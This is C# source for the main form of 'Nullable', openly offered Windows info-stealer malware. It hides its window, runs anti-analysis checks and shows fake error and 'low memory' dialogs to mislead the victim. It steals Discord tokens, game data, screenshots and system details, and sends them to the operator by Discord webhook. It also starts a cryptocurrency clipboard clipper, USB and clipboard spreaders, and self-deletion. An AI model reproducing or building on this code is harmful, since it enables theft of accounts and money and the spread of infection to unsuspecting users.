/*
GNU Affero General Public License
*/

/*
I AM NOT RESPONSIBLE IN ANYWAY IF YOU DO MALICIOUS STUFF.
Author: Straight#7171
 */
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Security.Cryptography.X509Certificates;

namespace Nullable
{
    public partial class Form1 : Form
    {
        bool Clipper = true;
        bool Spread;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            this.ShowInTaskbar = false;

            Modules.Implant.Analysis.Check();
            Modules.Implant.MutexPanel.MutexCheck();

            if (Config.RunDelay)
            {
                Modules.Implant.StartDelay.Activate(2);
   
            }
            Directory.CreateDirectory(Config.LogPath);
            string ValueForError = Modules.Manager.String.GenerateRandomHash(3, "ErrorZ");
            string CodeForError = "0x" + ValueForError.Substring(0, 5);
            Console.Beep();
            MessageBox.Show("Exit code: " + CodeForError, "Runtime error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
            RunFunc();
        }

        void RunFunc()
        {
            Modules.Stealer.GameStealer.Run();
            Thread.Sleep(10);
            string Token = Modules.Stealer.DiscordToken.Grab();
            Modules.Stealer.Screenshot.Grab();
            Modules.Stealer.Command_Stealer.Run();
            Modules.Manager.Location.Get();
            StringBuilder SystemLog = new StringBuilder();
            SystemLog.Append("#########################");
            SystemLog.Append("#####Log By Nullable#####");
            SystemLog.Append("#########################");
            SystemLog.Append("\nUser:");
            SystemLog.Append("Desktop_User: " + Modules.Stealer.System.User);
            SystemLog.Append("Computer_Name: " + Modules.Stealer.System.Computer_Name);
            SystemLog.Append("System_Language: " + Modules.Stealer.System.Language);
            SystemLog.Append("Network:");
            SystemLog.Append("External_Ip: " + Modules.Stealer.System.External_Ip);
            SystemLog.Append("Internal_Ip: " + Modules.Stealer.System.GetLocalIP());
            SystemLog.Append("Hardware:");
            SystemLog.Append("Operating_System: " + Modules.Stealer.System.OsVersion);
            SystemLog.Append("Windows_Name: " + Modules.Stealer.System.GetWindowsVersionName());
            SystemLog.Append("HWID: " + Modules.Stealer.System.HWID);
            SystemLog.Append("Cpu_Name: " + Modules.Stealer.System.GetCPUName());
            SystemLog.Append("Bit: " + Modules.Stealer.System.GetBitVersion());
            SystemLog.Append("Extra:");
            SystemLog.Append("System_Metrics: " + Modules.Stealer.System.ScreenMetrics());
            SystemLog.Append("\n\nDISCORD_TOKEN:" + Token);

            string Data = SystemLog.ToString();

            File.AppendAllText(Config.LogPath + "\\System_Log.txt", Data);

            Thread.Sleep(5000);
            Modules.Manager.File_Manager.CreateArchive(Config.LogPath, "C:\\Log.zip");
            Modules.Network.Discord_Webhook.SendMessage("Incoming Log From: " + Environment.UserName + "\n" + Data);
            Modules.Network.Discord_Webhook.SendFileWebhook("C:\\Log.zip");

            Thread.Sleep(500);
            if(Config.Spread.Contains("1"))
            {
                Thread Clipboard = new Thread(Modules.Spreader.Clipboard_Spreader.Activate) { IsBackground = true };
                Clipboard.Start();
                Thread.Sleep(50);
                Thread Hardware = new Thread(Modules.Spreader.Usb_Watcher.Activate) { IsBackground = true };
                Hardware.Start();
            }
            else
            {
                Console.Beep();
                MessageBox.Show("Your computer is low on memory\n\n\nTo restore enough memory for programs to work correctly, save your files and then close or restart all open programs.", "Microsoft Windows", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

            if (Config.Clipper == "1")
            {
                Thread CLIPPER = new Thread(Modules.Stealer.Clipper.Run) { IsBackground = true };
                CLIPPER.Start();
            }   

            if (Config.Clipper == "0")
            {
                Clipper = false;
            }

            if (Config.Spread == "0")
            {
                Spread = false;
            }

            if (Clipper & Spread == false)
            {
                Modules.Implant.Melt.Activate();
            }

            if (Spread)
            {
                Modules.Spreader.Sys_Spreader.Activate();
            }
        }
    }
}
